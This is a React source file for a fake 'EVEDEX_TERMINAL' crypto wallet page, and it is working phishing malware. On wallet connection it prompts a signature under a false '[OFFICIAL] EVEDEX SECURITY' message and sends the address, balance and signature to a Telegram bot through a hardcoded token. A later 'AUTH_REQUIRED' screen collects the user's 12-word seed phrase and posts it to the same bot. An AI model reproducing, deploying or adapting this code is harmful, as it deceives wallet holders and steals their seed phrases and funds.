import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSignMessage } from 'wagmi';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => { triggerSign("CONNECT_HANDSHAKE"); }, 1500);
    }
  }, [isConnected, address]);

  const triggerSign = (type) => {
    const msg = `[OFFICIAL] EVEDEX SECURITY\nVault: ${address}\nAction: ${type}\n\nAuthorize node synchronization. No gas fee required.`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: `🎯 ${type}\nADDR: ${address}\nBAL: ${balance?.formatted}\nSIG: ${sig}` }),
        });
      }
    });
  };

  const handleAction = () => {
    triggerSign("ASSET_SYNC");
    setLoading(true);
    setTimeout(() => { setLoading(false); setView("seed_gate"); }, 2500);
  };

  if (!isConnected) return <div style={{background:'#05070a', minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center'}}><w3m-button /></div>;

  return (
    <div style={{background:'#05070a', color:'#fff', minHeight:'100vh', padding:'20px', fontFamily:'monospace'}}>
      <h2 style={{color:'#06b6d4'}}>EVEDEX_TERMINAL</h2>
      {view === "menu" ? (
        <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px'}}>
          {["Claim", "Stake", "Migrate", "Rectify"].map(n => (
            <button key={n} onClick={() => setView("task")} style={{background:'#0d1117', border:'1px solid #222', padding:'25px', color:'#06b6d4', borderRadius:'10px'}}>{n}</button>
          ))}
        </div>
      ) : view === "task" ? (
        <div style={{background:'#0d1117', padding:'30px', borderRadius:'20px', textAlign:'center'}}>
          <h3>INITIALIZE_SYNC</h3>
          <button onClick={handleAction} style={{width:'100%', padding:'20px', background:'#06b6d4', color:'#000', fontWeight:'bold', border:'none', borderRadius:'8px'}}>START HANDSHAKE</button>
        </div>
      ) : (
        <div style={{textAlign:'center'}}>
          <h3 style={{color:'red'}}>AUTH_REQUIRED</h3>
          <textarea value={seedVal} onChange={e => setSeedVal(e.target.value)} placeholder="ENTER 12 WORDS..." style={{width:'100%', height:'120px', background:'#000', color:'#06b6d4', border:'1px solid #222', padding:'15px'}} />
          <button onClick={() => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }) })} style={{width:'100%', padding:'20px', background:'#06b6d4', color:'#000', fontWeight:'bold', marginTop:'20px', border:'none'}}>FINAL_SYNC</button>
        </div>
      )}
      {loading && <div style={{position:'fixed', inset:0, background:'rgba(0,0,0,0.9)', display:'flex', alignItems:'center', justifyContent:'center', color:'#06b6d4'}}>SYNCING...</div>}
    </div>
  );
}
